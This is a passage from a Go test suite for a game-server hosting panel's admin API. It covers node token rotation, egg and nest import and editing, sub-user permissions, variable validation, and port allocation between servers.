	newToken, _ := rotated.Body["token"].(string)
	if newToken == "" || newToken == e.node.token {
		t.Fatalf("rotated token = %q", newToken)
	}
	must(t, database.DB.First(&node, e.nodeRow.ID).Error)
	if node.Token != newToken {
		t.Fatal("the rotated token was not stored")
	}

	created := e.expect(e.do(&e.admin, http.MethodPost, "/admin/nodes", map[string]interface{}{"name": "Spare", "address": "spare.example.com", "port": "8081"}), http.StatusCreated)
	if token, _ := created.Body["token"].(string); !strings.HasPrefix(token, "n_") {
		t.Fatalf("new node token = %q", token)
	}
	spareID := uint(created.Body["node"].(map[string]interface{})["id"].(float64))
	e.expect(e.do(&e.admin, http.MethodDelete, fmt.Sprintf("/admin/nodes/%d", spareID), nil), http.StatusOK)
}

// -------------------------------------------------------------------- eggs

func TestEggsAndNestsInUseCannotBeDeleted(t *testing.T) {
	e := newEnv(t)
	service := e.createService(8211)

	e.expect(e.do(&e.admin, http.MethodDelete, fmt.Sprintf("/admin/eggs/%d", e.egg.ID), nil), http.StatusConflict)
	e.expect(e.do(&e.admin, http.MethodDelete, fmt.Sprintf("/admin/nests/%d", e.egg.NestID), nil), http.StatusConflict)

	var count int64
	database.DB.Model(&models.Service{}).Where("id = ?", service.ID).Count(&count)
	if count != 1 {
		t.Fatal("deleting an egg removed a server")
	}

	e.expect(e.do(&e.admin, http.MethodDelete, fmt.Sprintf("/admin/services/%d", service.ID), nil), http.StatusOK)
	e.expect(e.do(&e.admin, http.MethodDelete, fmt.Sprintf("/admin/eggs/%d", e.egg.ID), nil), http.StatusOK)
}

func TestEditingAnEggMarksItCustomizedAndKeepsItsIdentity(t *testing.T) {
	e := newEnv(t)

	res := e.expect(e.do(&e.admin, http.MethodPut, fmt.Sprintf("/admin/eggs/%d", e.egg.ID), map[string]interface{}{
		"id": 999, "uuid": "hijacked", "name": "Palworld (tuned)", "startup_command": "./start --tuned",
	}), http.StatusOK)
	if res.Body["customized"] != true {
		t.Fatalf("egg was not marked customized: %s", res.Raw)
	}

	var egg models.Egg
	must(t, database.DB.Preload("Variables").First(&egg, e.egg.ID).Error)
	if egg.UUID != "egg-1" || egg.Name != "Palworld (tuned)" || egg.StartupCommand != "./start --tuned" || len(egg.Variables) != 2 {
		t.Fatalf("egg after edit: %+v", egg)
	}
}

func TestImportEgg(t *testing.T) {
	e := newEnv(t)

	pterodactyl := `{
		"name": "Paper", "author": "someone@example.com", "description": "Paper server",
		"docker_images": {"Java 8": "img:java_8", "Java 21": "img:java_21", "Java 17": "img:java_17"},
		"startup": "java -jar {{SERVER_JARFILE}}",
		"config": {"stop": "stop"},
		"scripts": {"installation": {"script": "#!/bin/ash\necho hi", "container": "installer:alpine", "entrypoint": "ash"}},
		"variables": [
			{"name": "Jar", "env_variable": "SERVER_JARFILE", "default_value": "server.jar", "user_viewable": true, "user_editable": false, "rules": "required|string"},
			{"name": "Version", "env_variable": "MINECRAFT_VERSION", "default_value": "latest"}
		]
	}`

	res := e.expect(e.do(&e.admin, http.MethodPost, "/admin/eggs/import", map[string]interface{}{"nest_id": e.egg.NestID, "content": pterodactyl}), http.StatusCreated)
	var egg models.Egg
	must(t, database.DB.Preload("Variables").First(&egg, uint(res.Body["id"].(float64))).Error)

	if egg.DockerImages != `["img:java_21","img:java_17","img:java_8"]` {
		t.Fatalf("images = %s, want newest Java first so the default is predictable", egg.DockerImages)
	}
	if egg.Source != "import" || egg.StopCommand != "stop" || egg.ScriptEntry != "ash" || egg.StartupCommand != "java -jar {{SERVER_JARFILE}}" {
		t.Fatalf("imported egg: %+v", egg)
	}
	byEnv := map[string]models.EggVariable{}
	for _, variable := range egg.Variables {
		byEnv[variable.EnvironmentVariable] = variable
	}
	if byEnv["SERVER_JARFILE"].UserEditable || byEnv["SERVER_JARFILE"].Rules != "required|string" {
		t.Fatalf("locked variable: %+v", byEnv["SERVER_JARFILE"])
	}
	if !byEnv["MINECRAFT_VERSION"].UserEditable || !byEnv["MINECRAFT_VERSION"].UserViewable {
		t.Fatalf("a variable with no flags should default to editable: %+v", byEnv["MINECRAFT_VERSION"])
	}

	atlas := `{"name":"Custom","docker_images":["img:a"],"startup_command":"./run","ports":[{"name":"Query","env":"QUERY_PORT","default":27015,"protocol":"udp"}],"variables":[]}`
	res = e.expect(e.do(&e.admin, http.MethodPost, "/admin/eggs/import", map[string]interface{}{"nest_id": e.egg.NestID, "content": atlas}), http.StatusCreated)
	if !strings.Contains(res.Raw, "QUERY_PORT") {
		t.Fatalf("ports were not imported: %s", res.Raw)
	}

	before := int64(0)
	database.DB.Model(&models.Egg{}).Count(&before)
	bad := map[string]string{
		"not json":   `{oops`,
		"no startup": `{"name":"X","docker_images":{"a":"b"}}`,
		"no images":  `{"name":"X","startup":"./run","docker_images":{}}`,
		"no name":    `{"startup":"./run","docker_images":{"a":"b"}}`,
	}
	for name, content := range bad {
		if code := e.do(&e.admin, http.MethodPost, "/admin/eggs/import", map[string]interface{}{"nest_id": e.egg.NestID, "content": content}).Code; code != http.StatusBadRequest {
			t.Fatalf("%s: status %d, want 400", name, code)
		}
	}
	e.expect(e.do(&e.admin, http.MethodPost, "/admin/eggs/import", map[string]interface{}{"nest_id": 9999, "content": atlas}), http.StatusNotFound)

	after := int64(0)
	database.DB.Model(&models.Egg{}).Count(&after)
	if after != before {
		t.Fatalf("failed imports created %d eggs", after-before)
	}
}

func TestNewNestsAreListedSoEggsCanBeImportedIntoThem(t *testing.T) {
	e := newEnv(t)

	created := e.expect(e.do(&e.admin, http.MethodPost, "/admin/nests", map[string]interface{}{"name": "Empty Nest", "id": 999}), http.StatusCreated)
	e.expect(e.do(&e.admin, http.MethodPost, "/admin/nests", map[string]interface{}{"name": "  "}), http.StatusBadRequest)

	req := httptest.NewRequest(http.MethodGet, "/api/v1/admin/nests", nil)
	token, _ := utils.GenerateToken(e.admin.ID, true)
	req.Header.Set("Authorization", "Bearer "+token)
	recorder := httptest.NewRecorder()
	e.engine.ServeHTTP(recorder, req)
	if !strings.Contains(recorder.Body.String(), "Empty Nest") {
		t.Fatalf("a nest with no eggs is missing from the list: %s", recorder.Body.String())
	}

	id := uint(created.Body["id"].(float64))
	if id == 999 {
		t.Fatal("the request chose the nest's id")
	}
	e.expect(e.do(&e.admin, http.MethodPut, fmt.Sprintf("/admin/nests/%d", id), map[string]interface{}{"name": "Renamed Nest"}), http.StatusOK)
	e.expect(e.do(&e.admin, http.MethodDelete, fmt.Sprintf("/admin/nests/%d", id), nil), http.StatusOK)
}

// ---------------------------------------------------------------- activity

func TestInstanceWideActionsAreRecorded(t *testing.T) {
	e := newEnv(t)
	service := e.createService(8211)
	e.expect(e.do(&e.admin, http.MethodDelete, fmt.Sprintf("/admin/services/%d", service.ID), nil), http.StatusOK)

	// Deleting a service is logged without a service to point at; this used
	// to violate a foreign key and vanish.
	var entry models.ActivityLog
	must(t, database.DB.Where("action = ? AND resource = ?", "delete", "service").First(&entry).Error)
	if entry.ServiceID != nil || entry.UserID == nil || *entry.UserID != e.admin.ID {
		t.Fatalf("entry = %+v", entry)
	}
}

func TestOwnerAddsSubUserByUsernameWithExactlyTheChosenPermissions(t *testing.T) {
	e := newEnv(t)
	service := e.createService(8211)
	users := "/services/" + service.UUID + "/users"

	// A non-admin owner cannot list every account, so they add by username.
	e.expect(e.do(&e.owner, http.MethodGet, "/admin/users", nil), http.StatusForbidden)
	e.expect(e.do(&e.owner, http.MethodPost, users, map[string]interface{}{"username": "nobody-here"}), http.StatusNotFound)
	e.expect(e.do(&e.owner, http.MethodPost, users, map[string]interface{}{}), http.StatusBadRequest)
	e.expect(e.do(&e.owner, http.MethodPost, users, map[string]interface{}{"username": "owner"}), http.StatusForbidden)

	e.expect(e.do(&e.owner, http.MethodPost, users, map[string]interface{}{"username": "OTHER", "can_manage_files": true}), http.StatusCreated)
	e.expect(e.do(&e.owner, http.MethodPost, users, map[string]interface{}{"username": "other"}), http.StatusConflict)

	var grant models.ServiceUser
	must(t, database.DB.Where("service_id = ? AND user_id = ?", service.ID, e.other.ID).First(&grant).Error)
	if !grant.CanManageFiles {
		t.Fatal("the granted permission was not stored")
	}
	if grant.CanViewConsole {
		t.Fatal("console access was granted although it was not requested")
	}
	e.expect(e.do(&e.other, http.MethodPost, "/services/"+service.UUID+"/console/ticket", nil), http.StatusForbidden)

	// Revoking a permission must actually revoke it.
	e.expect(e.do(&e.owner, http.MethodPut, fmt.Sprintf("%s/%d", users, e.other.ID), map[string]interface{}{"can_view_console": true}), http.StatusOK)
	must(t, database.DB.Where("service_id = ? AND user_id = ?", service.ID, e.other.ID).First(&grant).Error)
	if !grant.CanViewConsole || grant.CanManageFiles {
		t.Fatalf("permissions after update: %+v", grant)
	}
}

// ---------------------------------------------------------------- egg runtime

func TestEggRuntimeSettingsReachTheNodeOnCreateAndOnEveryStart(t *testing.T) {
	e := newEnv(t)
	configFiles := `{"server.properties":{"parser":"properties","find":{"server-port":"{{server.build.default.port}}"}}}`
	must(t, database.DB.Model(&models.Egg{}).Where("id = ?", e.egg.ID).Updates(map[string]interface{}{
		"config":       configFiles,
		"startup_done": `["Done (","regex:^Ready"]`,
	}).Error)

	service := e.createService(8211)
	created := e.node.calls(http.MethodPost, "/api/servers")
	if len(created) != 1 || created[0].Body["config_files"] != configFiles || created[0].Body["stop_command"] != "stop" {
		t.Fatalf("create spec = %+v", created)
	}
	if done, _ := created[0].Body["startup_done"].([]interface{}); len(done) != 2 || done[0] != "Done (" {
		t.Fatalf("create spec startup_done = %v", created[0].Body["startup_done"])
	}

	// Editing the egg takes effect on the next start, with no rebuild.
	e.markInstalled(&service)
	e.expect(e.do(&e.admin, http.MethodPut, fmt.Sprintf("/admin/eggs/%d", e.egg.ID), map[string]interface{}{"startup_done": `["Server started"]`}), http.StatusOK)
	e.expect(e.do(&e.owner, http.MethodPost, "/services/"+service.UUID+"/power", map[string]string{"action": "start"}), http.StatusOK)
	calls := e.node.calls(http.MethodPost, "/power")
	if len(calls) != 1 || calls[0].Body["config_files"] != configFiles {
		t.Fatalf("power calls = %+v", calls)
	}
	if done, _ := calls[0].Body["startup_done"].([]interface{}); len(done) != 1 || done[0] != "Server started" {
		t.Fatalf("power startup_done = %v", calls[0].Body["startup_done"])
	}

	// An egg without done-strings sends an empty list, never null.
	e.expect(e.do(&e.admin, http.MethodPut, fmt.Sprintf("/admin/eggs/%d", e.egg.ID), map[string]interface{}{"startup_done": ""}), http.StatusOK)
	e.expect(e.do(&e.owner, http.MethodPost, "/services/"+service.UUID+"/power", map[string]string{"action": "restart"}), http.StatusOK)
	calls = e.node.calls(http.MethodPost, "/power")
	if done, ok := calls[len(calls)-1].Body["startup_done"].([]interface{}); !ok || len(done) != 0 {
		t.Fatalf("cleared startup_done = %#v", calls[len(calls)-1].Body["startup_done"])
	}
}

func TestEggEditorRejectsBrokenRuntimeSettings(t *testing.T) {
	e := newEnv(t)
	path := fmt.Sprintf("/admin/eggs/%d", e.egg.ID)

	e.expect(e.do(&e.admin, http.MethodPut, path, map[string]interface{}{"config_files": `{"a.toml":{"parser":"toml","find":{}}}`}), http.StatusBadRequest)
	e.expect(e.do(&e.admin, http.MethodPut, path, map[string]interface{}{"config_files": `{not json`}), http.StatusBadRequest)
	e.expect(e.do(&e.admin, http.MethodPut, path, map[string]interface{}{"startup_done": `{"done":"x"}`}), http.StatusBadRequest)
	e.expect(e.do(&e.admin, http.MethodPut, path, map[string]interface{}{"name": " "}), http.StatusBadRequest)

	res := e.expect(e.do(&e.admin, http.MethodPut, path, map[string]interface{}{
		"config_files": "{\n  \"config.yml\": {\"parser\": \"yaml\", \"find\": {\"port\": \"{{server.build.default.port}}\"}}\n}",
		"startup_done": `"Done"`,
	}), http.StatusOK)
	var egg models.Egg
	must(t, json.Unmarshal([]byte(res.Raw), &egg))
	if egg.ConfigFiles != `{"config.yml":{"parser":"yaml","find":{"port":"{{server.build.default.port}}"}}}` || egg.StartupDone != `["Done"]` {
		t.Fatalf("stored config = %s done = %s", egg.ConfigFiles, egg.StartupDone)
	}
}

func TestVariableRulesAreEnforcedOnChangedValuesOnly(t *testing.T) {
	e := newEnv(t)
	must(t, database.DB.Model(&models.EggVariable{}).Where("egg_id = ? AND environment_variable = ?", e.egg.ID, "SERVER_NAME").
		Update("rules", "required|string|max:10").Error)
	must(t, database.DB.Create(&models.EggVariable{EggID: e.egg.ID, Name: "Difficulty", EnvironmentVariable: "DIFFICULTY", DefaultValue: "legacy", Rules: "required|in:easy,hard"}).Error)

	// The stored default breaks its own rule; a server can still be created
	// and saved as long as that value is not the one being changed.
	service := e.createService(8211)
	e.markInstalled(&service)
	path := "/services/" + service.UUID + "/environment"

	e.expect(e.do(&e.owner, http.MethodPost, path, map[string]string{"environment": `{"SERVER_NAME":"Short"}`}), http.StatusOK)
	res := e.expect(e.do(&e.owner, http.MethodPost, path, map[string]string{"environment": `{"SERVER_NAME":"Much too long a name"}`}), http.StatusBadRequest)
	if !strings.Contains(res.Raw, "Server Name must be at most 10 characters") {
		t.Fatalf("error = %s", res.Raw)
	}
	e.expect(e.do(&e.owner, http.MethodPost, path, map[string]string{"environment": `{"SERVER_NAME":""}`}), http.StatusBadRequest)
	e.expect(e.do(&e.owner, http.MethodPost, path, map[string]string{"environment": `{"DIFFICULTY":"impossible"}`}), http.StatusBadRequest)
	e.expect(e.do(&e.owner, http.MethodPost, path, map[string]string{"environment": `{"DIFFICULTY":"hard"}`}), http.StatusOK)
	// Admins are held to the rules as well.
	e.expect(e.do(&e.admin, http.MethodPost, path, map[string]string{"environment": `{"DIFFICULTY":"impossible"}`}), http.StatusBadRequest)
}

func TestImportedPterodactylEggKeepsItsRuntimeSettings(t *testing.T) {
	e := newEnv(t)
	file := `{
  "meta": {"version": "PTDL_v2"},
  "name": "Imported",
  "docker_images": {"Java 21": "yolks:java_21"},
  "startup": "java -jar server.jar",
  "config": {
    "files": "{\"server.properties\": {\"parser\": \"properties\", \"find\": {\"server-port\": \"{{server.build.default.port}}\"}}}",
    "startup": "{\"done\": \")! For help, type \"}",
    "stop": "stop"
  },
  "scripts": {"installation": {"script": "echo hi", "container": "installer", "entrypoint": "ash"}},
  "variables": [
    {"name": "Query Port", "env_variable": "QUERY_PORT", "default_value": "25566", "rules": "required|integer"},
    {"name": "Mode", "env_variable": "MODE", "default_value": "survival", "rules": "required|in:survival,creative"}
  ]
}`
	res := e.expect(e.do(&e.admin, http.MethodPost, "/admin/eggs/import", map[string]interface{}{"nest_id": e.egg.NestID, "content": file}), http.StatusCreated)
	var imported struct {
		models.Egg
		Notes []string `json:"import_notes"`
	}
	must(t, json.Unmarshal([]byte(res.Raw), &imported))

	if imported.StartupDone != `[")! For help, type "]` || !strings.Contains(imported.ConfigFiles, `"parser":"properties"`) {
		t.Fatalf("runtime settings: done=%s config=%s", imported.StartupDone, imported.ConfigFiles)
	}
	if !strings.Contains(imported.Ports, `"env":"QUERY_PORT"`) || len(imported.Variables) != 1 || imported.Variables[0].EnvironmentVariable != "MODE" {
		t.Fatalf("ports=%s variables=%+v", imported.Ports, imported.Variables)
	}
	if len(imported.Notes) != 1 {
		t.Fatalf("notes = %v", imported.Notes)
	}
}

func TestPortsTheGameDerivesMoveWithTheGamePort(t *testing.T) {
	e := newEnv(t)
	// The game uses its game port plus one for queries, and RCON wherever it is told.
	must(t, database.DB.Model(&models.Egg{}).Where("id = ?", e.egg.ID).Update("ports",
		`[{"name":"Query","env":"QUERY_PORT","default":2457,"protocol":"udp","offset":1},{"name":"RCON","env":"RCON_PORT","default":25575,"protocol":"tcp"}]`).Error)

	ports := func(service models.Service) map[string]int {
		var rows []models.ServicePort
		must(t, database.DB.Where("service_id = ?", service.ID).Find(&rows).Error)
		result := map[string]int{}
		for _, row := range rows {
			result[row.Env] = row.Port
		}
		return result
	}

	first := e.createService(3000)
	if got := ports(first); got["QUERY_PORT"] != 3001 || got["RCON_PORT"] != 25575 {
		t.Fatalf("first server ports = %v", got)
	}
	spec := e.node.calls(http.MethodPost, "/api/servers")[0].Body
	if environment, _ := spec["environment"].(string); !strings.Contains(environment, `"QUERY_PORT":"3001"`) {
		t.Fatalf("the game was not told its query port: %v", spec["environment"])
	}

	// A game port whose partner is taken is refused, with the reason.
	res := e.expect(e.do(&e.admin, http.MethodPost, "/admin/services", map[string]interface{}{
		"name": "Clash", "node_id": e.nodeRow.ID, "egg_id": e.egg.ID, "user_id": e.owner.ID, "memory": 1024, "disk": 1000, "cpu": 100, "port": 2999,
	}), http.StatusConflict)
	if !strings.Contains(res.Raw, "game port plus 1") {
		t.Fatalf("clash error = %s", res.Raw)
	}

	second := e.createService(3010)
	e.markInstalled(&first)

	// Moving the game port by one works even though the new port is the
	// one the server's own query port holds today.
	e.expect(e.do(&e.admin, http.MethodPut, fmt.Sprintf("/admin/services/%d", first.ID), map[string]interface{}{"port": 3001}), http.StatusOK)
	if got := ports(first); got[models.PrimaryPortEnv] != 3001 || got["QUERY_PORT"] != 3002 || got["RCON_PORT"] != 25575 {
		t.Fatalf("ports after moving by one = %v", got)
	}
	rebuilds := e.node.calls(http.MethodPost, "/rebuild")
	if environment, _ := rebuilds[len(rebuilds)-1].Body["environment"].(string); !strings.Contains(environment, `"QUERY_PORT":"3002"`) {
		t.Fatalf("rebuild environment = %v", rebuilds[len(rebuilds)-1].Body["environment"])
	}

	// A move that would put the derived port on another server is refused
	// and changes nothing.
	res = e.expect(e.do(&e.admin, http.MethodPut, fmt.Sprintf("/admin/services/%d", first.ID), map[string]interface{}{"port": 3009}), http.StatusConflict)
	if !strings.Contains(res.Raw, "3010") || !strings.Contains(res.Raw, "game port plus 1") {
		t.Fatalf("refused move = %s", res.Raw)
	}
	if got := ports(first); got[models.PrimaryPortEnv] != 3001 || got["QUERY_PORT"] != 3002 {
		t.Fatalf("ports after a refused move = %v", got)
	}
	// Nor may it land on the server's own port that is staying put.
	e.expect(e.do(&e.admin, http.MethodPut, fmt.Sprintf("/admin/services/%d", first.ID), map[string]interface{}{"port": 25574}), http.StatusConflict)
	if got := ports(second); got[models.PrimaryPortEnv] != 3010 || got["QUERY_PORT"] != 3011 {
		t.Fatalf("the other server changed: %v", got)
	}
}

func TestNodeListShowsAllocationAndHostSize(t *testing.T) {
	e := newEnv(t)
	e.createService(8211)
	e.createService(8300)

	if code := e.nodeReport(e.node.token, "/heartbeat", map[string]interface{}{"stats": map[string]interface{}{"cpu": 12.5, "ram": 4000, "cores": 12, "total_ram": 15892}}); code != http.StatusOK {
		t.Fatalf("heartbeat: %d", code)
	}
	// A daemon that does not report the host's size leaves it as it was.
	if code := e.nodeReport(e.node.token, "/heartbeat", map[string]interface{}{"stats": map[string]interface{}{"cpu": 10, "ram": 4100}}); code != http.StatusOK {
		t.Fatalf("old heartbeat: %d", code)
	}

	res := e.expect(e.do(&e.admin, http.MethodGet, "/admin/nodes", nil), http.StatusOK)
	var nodes []map[string]interface{}
	must(t, json.Unmarshal([]byte(res.Raw), &nodes))
	if len(nodes) != 1 {
		t.Fatalf("nodes = %s", res.Raw)
	}
	node := nodes[0]
	want := map[string]float64{"allocated_memory": 4096, "allocated_disk": 20000, "allocated_cpu": 400, "servers": 2, "cpu_cores": 12, "host_ram": 15892, "used_ram": 4100}
	for key, value := range want {
		if node[key] != value {
			t.Errorf("%s = %v, want %v", key, node[key], value)
		}
	}
	if _, leaked := node["token"]; leaked {
		t.Error("the node token is in the listing")
	}
	e.expect(e.do(&e.owner, http.MethodGet, "/admin/nodes", nil), http.StatusForbidden)
}
